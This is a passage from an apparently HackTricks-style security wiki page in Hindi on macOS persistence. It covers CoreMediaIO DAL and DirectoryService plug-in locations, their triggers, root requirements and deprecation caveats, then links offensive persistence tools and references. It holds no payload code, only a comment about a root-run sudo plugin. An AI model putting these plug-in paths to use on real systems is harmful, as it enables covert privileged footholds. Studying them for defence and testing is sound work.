# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
न्यूनतम उदाहरण: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Legacy mechanism:** macOS 12.3 से deprecated। macOS 14.1 और उसके बाद के संस्करणों में legacy video plug-ins डिफ़ॉल्ट रूप से disabled होते हैं। इस path के काम करने से पहले उपयोगकर्ता को Recovery से legacy video support बहाल करना होगा; केवल writable directory होना पर्याप्त नहीं है। [Apple की मौजूदा support guidance](https://support.apple.com/en-us/108387) देखें।
- Plug-in directory में लिखने के लिए root आवश्यक है। Code execution किसी ऐसे compatible client पर निर्भर करता है जो अब भी DAL plug-ins load करता हो; macOS 26 पर इसका runtime परीक्षण नहीं किया गया।

#### Location

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - root आवश्यक
  - **Trigger:** legacy support बहाल किए जाने **के बाद**, कोई compatible camera client devices enumerate करता है। Client library validation किसी third-party plug-in को रोक सकती है।

#### Description & Exploitation

CoreMediaIO **DAL** (Device Abstraction Layer) plug-ins कुछ camera applications द्वारा उसी process में load किए जाते थे। Apple की [camera-extension presentation](https://developer.apple.com/videos/play/wwdc2022/10022/) में स्पष्ट कहा गया है कि legacy DAL plug-ins FaceTime, QuickTime Player या Photo Booth के साथ काम **नहीं** करते थे, और कई अन्य clients library validation लागू करते हैं। आधुनिक [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) अलग installation और approval model के साथ process के बाहर चलती हैं। ऐतिहासिक in-process technique का अर्थ यह नहीं है कि मौजूदा macOS पर सामान्य Camera TCC bypass संभव है।<sup>[[53]](#references)[[54]](#references)</sup>

macOS 26 पर केवल-पढ़ने योग्य निरीक्षण: `/Library/CoreMediaIO/Plug-Ins/DAL` मौजूद है और root के स्वामित्व में है। किसी भी client में legacy support या loading की पुष्टि नहीं की गई।

### Directory Service Plugins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Legacy, conditional mechanism:** Install करने के लिए root और ऐसा plug-in आवश्यक है जो वास्तव में configured और loaded हो। DirectoryService का plug-in API deprecated है; इसे boot trigger मानने से पहले target Mac का Open Directory configuration देखें।

#### Location

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - root आवश्यक
  - **Trigger:** Open Directory को ज़रूरत पड़ने पर `dspluginhelperd` किसी योग्य, configured plug-in को load करता है। [Apple की plug-in runtime guide](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) के अनुसार, startup के लिए configured न किए गए plug-ins तब lazily load हो सकते हैं जब उनका node खोला जाए।

#### Description & Exploitation

`dspluginhelperd` legacy DirectoryService plug-in bundles को support करता है। जहाँ legacy plug-in स्वीकार और activate किया जाता है, वहाँ malicious plug-in privileged execution path बन सकता है; यह PAM और Authorization Plugins से अलग है। Directory का मौजूद होना इस बात का प्रमाण नहीं है कि नया लिखा गया plug-in अगले boot पर चलेगा। macOS 26.5 पर Apple के स्थानीय `dspluginhelperd(8)` और `opendirectoryd(8)` manuals में अब भी helper और यह legacy path सूचीबद्ध हैं।<sup>[[53]](#references)</sup>

macOS 26 पर केवल-पढ़ने योग्य निरीक्षण: `/Library/DirectoryServices/PlugIns` और `/usr/libexec/dspluginhelperd` मौजूद हैं। इस परीक्षण के दौरान कोई plug-in install, configure या load नहीं किया गया।

## Persistence techniques and tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, Infostealer का वर्ष](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [पुराने अच्छे LaunchAgents से आगे - 1 - shell startup files](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [पुराने अच्छे LaunchAgents से आगे - 18 - X11 और XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [पुराने अच्छे LaunchAgents से आगे - 21 - दोबारा खोले गए Applications](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [पुराने अच्छे LaunchAgents से आगे - 20 - Terminal Preferences](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [पुराने अच्छे LaunchAgents से आगे - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [पुराने अच्छे LaunchAgents से आगे - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [पुराने अच्छे LaunchAgents से आगे - 22 - LoginHook और LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [पुराने अच्छे LaunchAgents से आगे - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [पुराने अच्छे LaunchAgents से आगे - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [पुराने अच्छे LaunchAgents से आगे - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [पुराने अच्छे LaunchAgents से आगे - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [पुराने अच्छे LaunchAgents से आगे - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [पुराने अच्छे LaunchAgents से आगे - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [पुराने अच्छे LaunchAgents से आगे - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [पुराने अच्छे LaunchAgents से आगे - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS पर Persistence के लिए Folder Actions (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [पुराने अच्छे LaunchAgents से आगे - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [पुराने अच्छे LaunchAgents से आगे - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [पुराने अच्छे LaunchAgents से आगे - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener" Persistence का विश्लेषण (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [पुराने अच्छे LaunchAgents से आगे - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [अपनी पहुंच बनाए रखना: macOS Persistence के लिए Screensavers (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [पुराने अच्छे LaunchAgents से आगे - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [पुराने अच्छे LaunchAgents से आगे - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [पुराने अच्छे LaunchAgents से आगे - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [पुराने अच्छे LaunchAgents से आगे - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [पुराने अच्छे LaunchAgents से आगे - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Plugins के ज़रिए लगातार Credential Theft (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [पुराने अच्छे LaunchAgents से आगे - 30 - man config file - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [पुराने अच्छे LaunchAgents से आगे - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [पुराने अच्छे LaunchAgents से आगे - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [पुराने अच्छे LaunchAgents से आगे - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [पुराने अच्छे LaunchAgents से आगे - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [पुराने अच्छे LaunchAgents से आगे - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [पुराने अच्छे LaunchAgents से आगे - 10 - Application script files](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [पुराने अच्छे LaunchAgents से आगे - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [पुराने अच्छे LaunchAgents से आगे - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [पुराने अच्छे LaunchAgents से आगे - 34 - launchd boot tasks](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [पुराने अच्छे LaunchAgents से आगे - 35 - NVRAM के ज़रिए Persistence (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [OS X पर Persistence के लिए email का उपयोग (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [संदिग्ध Apple Mail Rule Plist Modification (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Malicious Profiles - Macs के लिए सबसे गंभीर खतरों में से एक (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware Vol.1 - Ch.0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [CVE-2024-44243 का विश्लेषण: kernel extensions के ज़रिए macOS SIP bypass (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [Claude Code Project Files के ज़रिए RCE और API Token Exfiltration (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub Copilot और Cursor में नई Vulnerability - Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Installation के वैकल्पिक तरीके (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Mac पर Chrome में ExtensionInstallForcelist हटाना (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sudo Plugins लिखने पर (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Custom URL Schemes के ज़रिए Remote Mac Exploitation (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Plugins का दुरुपयोग करने वाली macOS Persistence की दो तरकीबें (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL का न्यूनतम उदाहरण (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Spotlight-आधारित macOS TCC vulnerability का विश्लेषण (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` module का documentation (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Spotlight से Apple Intelligence तक — macOS AI को शक्ति देने वाला डेटा चुराने के लिए 0day का दुरुपयोग](https://objective-see.org/blog/blog_0x81.html)
- [58] [PEP 829 — Package Startup Configuration Files](https://peps.python.org/pep-0829/)
- [59] [Python 3.15 `site` documentation — startup entry points](https://docs.python.org/3.15/library/site.html)
- [60] [autorun-audit — PEP 829 और `.start` files](https://github.com/ag3ntsc4rn/autorun-audit)
{{#include ../banners/hacktricks-training.md}}
